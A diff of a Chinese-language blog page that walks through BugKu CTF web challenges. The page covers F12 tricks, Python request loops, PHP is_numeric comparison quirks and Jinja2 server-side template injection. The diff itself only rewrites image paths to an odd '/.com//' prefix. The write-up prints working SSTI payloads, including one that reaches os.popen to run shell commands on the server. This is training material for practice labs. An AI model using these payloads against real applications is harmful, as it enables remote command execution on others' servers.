@@ -142,10 +142,10 @@
     }
     detectApple()
     })(window)</script><meta name="generator" content="Hexo 6.1.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">32</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">25</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/topimg/')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Hexo</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">BugKu-Web</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-10-19T16:01:12.000Z" title="Created 2021-10-20 00:01:12">2021-10-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-04-22T14:31:06.155Z" title="Updated 2022-04-22 22:31:06">2022-04-22</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="BugKu-Web"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="前端漏洞"><a href="#前端漏洞" class="headerlink" title="前端漏洞"></a>前端漏洞</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>太简单了，本来不准备写的，但是为了完整还是写上去了。</p>
-<h2 id="F12"><a href="#F12" class="headerlink" title="F12"></a>F12</h2><h3 id="滑稽"><a href="#滑稽" class="headerlink" title="滑稽"></a>滑稽</h3><p><img src="/BugKu-Web/image-20211020114103929.png"></p>
+<h2 id="F12"><a href="#F12" class="headerlink" title="F12"></a>F12</h2><h3 id="滑稽"><a href="#滑稽" class="headerlink" title="滑稽"></a>滑稽</h3><p><img src="/.com//image-20211020114103929.png"></p>
 <p>直接右键检查元素即可看到flag。。。</p>
 <h3 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h3><p>F12修改html标签的maxlength属性，改的长一些即可输入正确答案，答案正确就会弹出来flag。</p>
-<p><img src="/BugKu-Web/image-20211020114400539.png"></p>
+<p><img src="/.com//image-20211020114400539.png"></p>
 <h2 id="Javascript"><a href="#Javascript" class="headerlink" title="Javascript"></a>Javascript</h2><h3 id="alert"><a href="#alert" class="headerlink" title="alert"></a>alert</h3><p>会无限弹框，这个时候直接使用python的request模块。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">resp = requests.get(<span class="string">&quot;http://114.67.246.176:12917/&quot;</span>).text</span><br><span class="line"><span class="built_in">print</span>(resp)</span><br></pre></td></tr></table></figure>
 
@@ -155,26 +155,26 @@
 <p>在线解码一下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在线工具： https://zh.rakko.tools/tools/21/</span><br></pre></td></tr></table></figure>
 
-<p><img src="/BugKu-Web/image-20211020120741392.png"></p>
+<p><img src="/.com//image-20211020120741392.png"></p>
 <h3 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://114.67.246.176:11063/&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    resp = requests.get(url).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&#123;&quot;</span> <span class="keyword">in</span> resp:</span><br><span class="line">        <span class="built_in">print</span>(resp)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 
 
 
 
 
-<h1 id="服务端模板注入-SSTI"><a href="#服务端模板注入-SSTI" class="headerlink" title="服务端模板注入(SSTI)"></a>服务端模板注入(SSTI)</h1><h2 id="Jinjia2"><a href="#Jinjia2" class="headerlink" title="Jinjia2"></a>Jinjia2</h2><h3 id="Simple-SSTI-1"><a href="#Simple-SSTI-1" class="headerlink" title="Simple_SSTI_1"></a>Simple_SSTI_1</h3><p><img src="/BugKu-Web/image-20211020000329616.png"></p>
+<h1 id="服务端模板注入-SSTI"><a href="#服务端模板注入-SSTI" class="headerlink" title="服务端模板注入(SSTI)"></a>服务端模板注入(SSTI)</h1><h2 id="Jinjia2"><a href="#Jinjia2" class="headerlink" title="Jinjia2"></a>Jinjia2</h2><h3 id="Simple-SSTI-1"><a href="#Simple-SSTI-1" class="headerlink" title="Simple_SSTI_1"></a>Simple_SSTI_1</h3><p><img src="/.com//image-20211020000329616.png"></p>
 <p>需要传个参数，上面随便传一个参数，给出提示，这个参数名为flag。</p>
 <p>payload</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://114.67.246.176:18833/?flag=&#123;&#123;config&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/BugKu-Web/image-20211020000500344.png"></p>
+<p><img src="/.com//image-20211020000500344.png"></p>
 <h3 id="Simple-SSTI-2"><a href="#Simple-SSTI-2" class="headerlink" title="Simple_SSTI_2"></a>Simple_SSTI_2</h3><p>思路为先看Object下的所有子类，使用以下的payload即可</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?flag=&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/BugKu-Web/image-20211020001208801.png"></p>
+<p><img src="/.com//image-20211020001208801.png"></p>
 <p>然后再找warningmessage这个类，可以带出来os类</p>
-<p><img src="/BugKu-Web/image-20211020001353045.png"></p>
-<p><img src="/BugKu-Web/image-20211020001542124.png"></p>
+<p><img src="/.com//image-20211020001353045.png"></p>
+<p><img src="/.com//image-20211020001542124.png"></p>
 <p><del>看到这个类在第177个位置，然后带出来os。。。</del></p>
 <p>失败，看看别人怎么写的</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat ./flag&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
@@ -197,7 +197,7 @@
 <h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$what</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;what&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$what</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$what</span>==<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;flag&#123;****&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>
 
 <p>payload</p>
-<p><img src="/BugKu-Web/image-20211020115157703.png"></p>
+<p><img src="/.com//image-20211020115157703.png"></p>
 <h2 id="技巧类型"><a href="#技巧类型" class="headerlink" title="技巧类型"></a>技巧类型</h2><h3 id="矛盾-is-numeric漏洞"><a href="#矛盾-is-numeric漏洞" class="headerlink" title="矛盾(is_numeric漏洞)"></a>矛盾(is_numeric漏洞)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$num</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;flag&#123;**********&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>is_numeric会将前面是数字，后面是字符的字符串判断为错，然后这个被判断的变量后面的字符会被去掉，所以这里的payload为</p>
